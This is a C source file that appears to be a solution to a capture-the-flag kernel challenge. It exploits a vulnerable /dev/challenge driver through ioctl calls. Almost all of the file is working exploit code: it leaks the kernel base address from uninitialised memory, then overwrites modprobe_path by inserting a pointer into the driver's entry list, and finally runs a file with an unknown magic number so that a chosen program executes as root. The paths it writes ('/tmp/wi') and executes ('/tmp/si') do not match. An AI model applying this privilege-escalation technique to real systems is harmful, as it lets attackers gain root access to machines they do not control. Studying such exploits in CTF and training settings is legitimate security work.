#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define DB_ALLOC 0x13370001
#define DB_EDIT 0x13370002
#define DB_GET 0x13370003
#define DB_FREE 0x13370004

typedef struct req_t {
  unsigned int idx;
  int pad;
  char tag[8];
  unsigned int size;
  int pad2;
  char* buffer;
} req_t;


typedef struct entry_t {
  char tag[8];
  char content[];
} entry_t;

req_t* req;

size_t in [256];
size_t out [256];


int alloc(int fd, char* tag, unsigned int idx, void* src, unsigned int size) {
  memcpy(req->tag,tag,8);
  req->idx = idx;
  req->size = size;
  req->buffer = src;
  printf("ALLOCATION REQUEST\n");
  printf(" - tag : %8.8s\n",tag);
  printf(" - index : %u\n",idx);
  printf(" - size : %u\n",size);
  printf(" - src : %p\n",src);
  int err = ioctl(fd,DB_ALLOC,req);
  printf("error code : %d\n\n",err);
  return err;
}


int edit(int fd, char* tag, unsigned int idx, void* src, unsigned int size) {
  memcpy(req->tag,tag,8);
  req->idx = idx;
  req->size = size;
  req->buffer = src;
  printf("EDIT REQUEST\n");
  printf(" - tag : %8.8s\n",tag);
  printf(" - index : %u\n",idx);
  printf(" - size : %u\n",size);
  printf(" - src : %p\n",src);
  int err = ioctl(fd,DB_EDIT,req);
  printf("error code : %d\n\n",err);
  return err;
}

int get(int fd, unsigned int idx, void* dst, unsigned int size) {
  memset(req->tag,0,8);
  req->idx = idx;
  req->size = size;
  req->buffer = dst;
  printf("GET REQUEST\n");
  printf(" - index : %u\n",idx);
  printf(" - size : %u\n",size);
  printf(" - dst : %p\n",dst);
  int err = ioctl(fd,DB_GET,req);
  printf("error code : %d\n\n",err);
  return err;
}

int free_(int fd, unsigned int idx) {
  memset(req->tag,0,8);
  req->idx = idx;
  req->size = 0;
  req->buffer = NULL;
  printf("FREE REQUEST\n");
  printf(" - index : %u\n",idx);
  int err = ioctl(fd,DB_FREE,req);
  printf("error code : %d\n\n",err);
  return err;
}

int main(){

  // this exploit leverages unitialized emps in module_init
  // if we win the race (proper data in emps chunk), we get kbase and abitrary write for free !

  req_t rq = {0};
  req = &rq;
  int fd = open("/dev/challenge",O_RDWR);
  if(fd < 0) {
    puts("error open");
    exit(1);
  }
  printf("device at %d\n",fd);
  int err = 0;

  // leak kbase
  err = get(fd,7,out,0x300-1);
  if(err != 0) {
    printf("FAIL\n");
    exit(1);
  }
  for(int i = 0 ; i < 0x20 * 3 ; ++i) {
    printf("%d : %zx\n",i,out[i]);
  }
  size_t kbase = out[11];
  kbase -= 0x3e98e0;
  printf("kbase : 0x%zx",kbase);

  // overwrite modprobe_path (ref: https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)
  // entries list has a pointer to itself, allowing us to insert an arbitrary pointer
  // and thus enabling arbitrary write
  size_t entries = out[0] - 0x30;
  size_t target = kbase + 0x1850ce0;
  edit(fd,&target,6,in,0);
  size_t target_idx = 6; // our target pointer is at index 6
  edit(fd,"/tmp/wi",target_idx,in,0); // executable called with privileges, when dealing with unknown magic !
  execve("/tmp/si",0,0); // executable file with unknown magic (first 4 bytes)

  return 0;
}
